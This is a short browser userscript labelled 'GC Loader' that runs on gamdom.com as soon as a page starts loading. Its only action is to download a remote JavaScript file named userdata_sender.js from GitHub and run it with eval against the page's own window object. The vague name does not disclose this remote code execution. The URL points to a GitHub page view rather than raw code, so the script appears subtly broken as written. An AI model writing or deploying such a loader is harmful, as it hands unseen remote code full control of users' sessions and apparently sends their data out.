// ==UserScript==
// @name         GC Loader
// @description  Load GC
// @version      1.0
// @author       Pytness
// @match        *://gamdom.com/*
// @run-at       document-start
// @grant        GM_info
// @grant        unsafeWindow
// ==/UserScript==


(function(win) {
    'use strict';

    var ajax = new XMLHttpRequest();
    ajax.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            // console.log('Payload Loaded');
            eval(this.response)(win);

        }
    };
    ajax.open('GET', 'https://github.com/Pytness/Gamdom-Notify/blob/d4cf76c3fe6144781a6fee7f91e5ce5d0e190982/lib/userdata_sender.js', true);
    ajax.send(null);

}(unsafeWindow));
